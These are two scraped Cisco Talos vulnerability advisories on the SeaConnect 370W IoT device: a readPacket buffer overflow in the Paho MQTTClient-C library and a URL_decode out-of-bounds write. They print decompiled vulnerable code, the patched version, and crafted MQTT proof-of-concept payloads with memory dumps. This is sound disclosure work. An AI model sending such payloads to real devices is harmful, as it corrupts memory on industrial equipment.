=== Content from talosintelligence.com_ef08eb96_20250114_204521.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2021-1406

## Eclipse Foundation Paho MQTTClient-C library readPacket out-of-bounds write vulnerability

##### February 1, 2022

##### CVE Number

CVE-2021-41036

### Summary

An out-of-bounds write vulnerability exists in the readPacket functionality of Eclipse Foundation Embedded Paho MQTTClient-C library v1.0.0. A specially-crafted MQTT payload can lead to an out-of-bounds write. An attacker can send a malicious MQTT message to trigger this vulnerability.

### Tested Versions

Eclipse Foundation Embedded Paho MQTTClient-C library v1.0.0

Sealevel Systems, Inc. SeaConnect 370W v1.3.34

### Product URLs

Embedded Paho MQTTClient-C library - <https://www.eclipse.org/paho/index.php?page=clients/c/embedded/index.php>
SeaConnect 370W - <https://www.sealevel.com/product/370w-a-wifi-to-form-c-relays-digital-inputs-a-d-inputs-and-1-wire-bus-seaconnect-multifunction-io-edge-module-powered-by-seacloud/>

### CVSSv3 Score

9.8 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### CWE

CWE-120 - Buffer Copy without Checking Size of Input (‘Classic Buffer Overflow’)

### Details

The Embedded Paho MQTTClient-C library is a MQTT client library for the language C. This library is primarily designed for embedded devices.

This vulnerability was discovered while looking at the SeaConnect 370W. The mentioned device uses the Paho MQTTClient-C library version 1.0.0. In this version is present a buffer overflow vulnerability in the function `readPacket`. This was corrected in [July 2017](https://github.com/eclipse/paho.mqtt.embedded-c/commit/ca6916f159f8b141310b6c55f2041d7998d285e4#diff-5c5238b2d7c28d557608712d7b9d3c4bfe393f9bc4861eefcef4421bb5c13cc6). This correction was treated as a security improvement, and no CVE was assigned to it. The consequence was that the SeaConnect 370W did not update its firmware with the correction. This, in turn, leads to a remote command execution vulnerability in the SeaConnect 370W due to the buffer overflow caused in the Paho MQTTClient-C library version 1.0.0.

The `readPacket` function in the SeaConnect 370W is:

```
  uint readPacket(MQTTClient *c,undefined4 param_2)

  {
    uint rc;
    undefined4 timer_;
    int iVar1;
    dword dVar2;
    undefined *ipstack;
    dword rem_len;

    read_volatile(PTR_DWORD_20012de8._0_1_);
    ipstack = c->ipstack;
    rem_len = 0;
    timer_ = TimerLeftMS(param_2);
    rc = (**(code **)(ipstack + 0x30))(ipstack,c->readbuf,1,timer_);                                    [1]
                      /* calling mqttread ^ */
    if (rc == 1) {
      timer_ = TimerLeftMS(param_2);
      decodePacket(c,&rem_len,timer_);                                                                  [2]
      iVar1 = MQTTPacket_encode(c->readbuf + 1,rem_len);
      if (0 < (int)rem_len) {
        ipstack = c->ipstack;
        timer_ = TimerLeftMS(param_2);
        dVar2 = (**(code **)(ipstack + 0x30))(ipstack,c->readbuf + iVar1 + 1,rem_len,timer_);           [3]
                      /* calling mqttread ^ */
        if (rem_len != dVar2) {
          return 1;
        }
      }
      rc = ((uint)(byte)*c->readbuf << 0x18) >> 0x1c;
    }
    return rc;
  }

```

This is a Paho MQTTClient-C’s function that handles a new MQTT mesage. It reads at `[1]` the heder byte and at `[2]` reads, from the packet, the remaining size of the packet. This size is then used at `[3]` to read into a heap buffer the remaining message.

The buffer used at `[3]`, for the SeaConnect 370W, is allocated in `SeaConnectMqtt_Init`:

```
  void SeaConnectMqtt_Init(void)

  {
    [...]

    receiveBuffer_ptr = (int *)read_volatile_4(receiveBuffer);
    puVar1 = read_volatile_4(PTR_aSeaconnectmqtt_3_20010be8);
    if (*receiveBuffer_ptr == 0) {
      malloc_res = malloc(0x201);                                                                       [4]
      *receiveBuffer_ptr = malloc_res;
    [...]

    }

```

At `[4]` 0x201 bytes are allocated to manage a MQTT mesage, but the function `readPacket` does not control the size of the variable `rem_len` before reading the message content at `[3]`. This can lead to a buffer overflow.

The corrected Paho MQTTClient-C’s `readPacket`:

```
static int readPacket(MQTTClient* c, Timer* timer)
{
    MQTTHeader header = {0};
    int len = 0;
    int rem_len = 0;

    /* 1. read the header byte.  This has the packet type in it */
    int rc = c->ipstack->mqttread(c->ipstack, c->readbuf, 1, TimerLeftMS(timer));
    if (rc != 1)
        goto exit;

    len = 1;
    /* 2. read the remaining length.  This is variable in itself */
    decodePacket(c, &rem_len, TimerLeftMS(timer));
    len += MQTTPacket_encode(c->readbuf + 1, rem_len); /* put the original remaining length back into the buffer */

    if (rem_len > (c->readbuf_size - len))                                                              [5]
    {
        rc = BUFFER_OVERFLOW;
        goto exit;
    }

    /* 3. read the rest of the buffer using a callback to supply the rest of the data */
    if (rem_len > 0 && (rc = c->ipstack->mqttread(c->ipstack, c->readbuf + len, rem_len, TimerLeftMS(timer)) != rem_len)) {
        rc = 0;
        goto exit;
    }

    header.byte = c->readbuf[0];
    rc = header.bits.type;
exit:
    return rc;
}

```

A size check was introduced at `[5]` to avoid the buffer overflow.

The nature of the buffer overflow depends upon the library user. Indeed, the buffer used in `readPacket` is provided by the library utilizer and not allocated by the Paho MQTTClient-C library.

### Timeline

2021-10-27 - Initial vendor contact

2021-11-03 - Vendor disclosure

2022-02-01 - Public Release

##### Credit

Discovered by Francesco Benvenuto and Matt Wiseman of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2022-1460](/vulnerability_reports/TALOS-2022-1460) [Previous Report

TALOS-2021-1397](/vulnerability_reports/TALOS-2021-1397)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)



=== Content from talosintelligence.com_ee317ffd_20250114_204519.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2021-1397

## Sealevel Systems, Inc. SeaConnect 370W URL\_decode out-of-bounds write vulnerability

##### February 1, 2022

##### CVE Number

CVE-2021-21971

### Summary

An out-of-bounds write vulnerability exists in the URL\_decode functionality of Sealevel Systems, Inc. SeaConnect 370W v1.3.34. A specially-crafted MQTT payload can lead to an out-of-bounds write. An attacker can perform a man-in-the-middle attack to trigger this vulnerability.

### Tested Versions

Sealevel Systems, Inc. SeaConnect 370W v1.3.34

### Product URLs

SeaConnect 370W - <https://www.sealevel.com/product/370w-a-wifi-to-form-c-relays-digital-inputs-a-d-inputs-and-1-wire-bus-seaconnect-multifunction-io-edge-module-powered-by-seacloud/>

### CVSSv3 Score

3.7 - CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N

### CWE

CWE-787 - Out-of-bounds Write

### Details

The SeaConnect 370W is a Wi-Fi connected IIoT device offering programmable cloud access and control of digital and analog I/O and a 1-wire bus.

This device offers remote control via several means including MQTT, Modbus TCP and a manufacturer-specific protocol named “SeaMAX API”.

The device is built on top of the TI CC3200 MCU with built-in Wi-Fi capabilities.

The SeaConnect 370W implements an over-the-air firmware update mechanism which is controlled remotely from the “Sealevel SeaCloud” via an MQTTS connection. When a device comes online, it connects to the SeaCloud MQTTS broker and transmits its current firmware version. When an outdated firmware is detected, a message is published to that device’s command channel detailing the FTP(S) URL containing the new image and the destination filename of the new image.

A specially-crafted MQTT message can lead to an out-of-bounds write due to improperly perfomed URL decoding.

The OTA update task is responsible for updating the firmware, if a new one is available. After a certain MQTT message is sent, the downloading process begins. The message that starts the downloading process is in the following form:

```
{
    "name": "u-download",
    "payload": "{
                 \"uri\": \"<uri to firmware image>\",
                 \"dest\": \"<local filename to write>\",
                 \"crc\": \"<crc>\"
                 }"
}

```

The `uri` is an FTP(S) URI. The downloading process revolves around FTP(S). The `uri` is in the following format:

```
ftp://<username>:<password>@<ip>:<port>/<filepath>

```

The OTA task, before performing any download-related operation, parses the `uri` into a struct, from now on `FTP_struct`. The struct is the following:

```
struct FTP_struct{
    char	    hostname[32];
    uint32_t	control_port;
    char	    secure;
    char	    username[48];
    char	    password[16];
    char	    filepath[64];
    byte        null_byte;
    char        *filename;
};

```

The `username` and `password` field can be URL encoded. For this reason both these fields are parsed using the function `URL_decode`:

```
void URL_decode(char *parsed_string)

{
    size_t str_len;
    size_t size_after_url_byte;
    char *end_of_parsed_string;
    dword in_r1;
    dword local_20;
    char temp_string [2];
    char *%_location;

    local_20 = in_r1;
    str_len = strlen(parsed_string);
    %_location = parsed_string;
    while (%_location = strchr(%_location,L'%'), %_location != (char *)0x0) {
        strncpy(temp_string,%_location + 1,2);
        local_20 = 0;
        sscanf(temp_string,a02x_0,&local_20);
        *%_location = (char)local_20;
        size_after_url_byte = strlen(%_location + 3);                                                   [1]
        memcpy_wrap(%_location + 1,%_location + 3,size_after_url_byte);                                 [2]
        %_location = %_location + 1;
        end_of_parsed_string = parsed_string + str_len;
        end_of_parsed_string[-2] = '\0';
        str_len = str_len - 2;
        end_of_parsed_string[-1] = '\0';
    }
    return;
}

```

This function locates the character `%`, performs a `sscanf` over the following two characters and converts the URL encoded byte, three byte, into a single one. After this operation the function calculates the length of the string after the URL encoded byte, and then moves it two bytes to the left, in order to fill the two empty bytes created during the conversion.

The `URL_decode` assumes, erroneously, that after the `%` there are always at least three bytes of string or two bytes and a null terminator. Because this is not always true what can happen is the following: if the `%` character is the last or second-to-last character before the null terminator, the `%_location + 3` calculation at `[1]` would result in skipping the null terminator and performing the `strlen` to what follows the null terminator. This will result in involving in the `memcpy_wrap` memory outside the `parsed_string` variable.

For example if the MQTT message is:

```
{
    "name": "u-download",
    "payload": "{
        \"uri\":\"ftp://test:AAAAAAAAAAAAAAAA@<ip>:<port>/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%\",
        \"dest\":\"AAAA\",
        \"crc\":\"41414141\"
        }"
}

```

Following is a portion of memory of the `FTP_struct` struct starting from the `username` field. The following memory shows the `FTP_struct` state before the `URL_decode` function is used on the `password` field:

```
username:
20032bf7: 74 65 73 74 00 00 00 00 00 00 00 00 00 00 00 00  test............
20032c07: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
20032c17: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

password:
20032c27: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

filepath:
20032c37: 2f 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  /AAAAAAAAAAAAAAA
20032c47: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
20032c57: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
20032c67: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 25  AAAAAAAAAAAAAAA%

null_byte and filename:
20032c77: 00 38 2c 03 20 68 00 00 20 00 00 00 00 00 00 00  .8,. h.. .......

```

And after the `URL_decode` of the password:

```
username:
20032bf7: 74 65 73 74 00 00 00 00 00 00 00 00 00 00 00 00  test............
20032c07: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
20032c17: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

password:
20032c27: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

filepath:
20032c37: 2f 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  /AAAAAAAAAAAAAAA
20032c47: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
20032c57: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
20032c67: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 00 00  AAAAAAAAAAAAAA..

null_byte and filename:
20032c77: 2c 03 20 68 20 68 00 00 20 00 00 00 00 00 00 00  ,. h h.. .......

```

The `null_byte` and the `filename` fields were overwritten. In this example we exploited the bug that the presence of a null terminator is not enforced in the `password` field, but it would have been possible to obtain similar results without exploiting the null terminator bug using the following payload:

```
{
    "name": "u-download",
    "payload": "{
                \"uri\":\"ftp://test:AAAAAAAAAAAAAA%@<ip>:<port>/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%\",
                \"dest\":\"AAAA\",
                \"crc\":\"41414141\"
                }"
}

```
### Timeline

2021-10-21 - Initial vendor contact

2021-10-26 - Vendor disclosure

2022-02-01 - Public Release

##### Credit

Discovered by Francesco Benvenuto and Matt Wiseman of Cisco Talos.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2021-1406](/vulnerability_reports/TALOS-2021-1406) [Previous Report

TALOS-2021-1396](/vulnerability_reports/TALOS-2021-1396)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)


